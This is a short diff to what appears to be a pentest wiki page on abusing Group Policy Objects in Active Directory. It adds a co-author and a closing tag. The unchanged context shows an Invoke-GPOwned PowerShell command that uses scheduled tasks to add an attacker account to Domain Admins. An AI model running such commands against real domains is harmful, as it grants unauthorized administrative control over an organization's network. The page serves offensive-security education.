@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo
+authors: ShutdownRepo, n0troot
 category: ad
 ---
 
@@ -84,6 +84,8 @@ Using [Invoke-GPOwned](https://github.com/n0troot/Invoke-GPOwned):
 ```powershell
 Invoke-GPOwned -GPOName "Target_GPO_Name"  -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" -User "Attacker" -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author "DA_User" -SecondXMLCMD "/r net group 'Domain Admins' <Attacker> /add /domain"
 ```
+
+:::
 
 ### Force Group Policy update
 
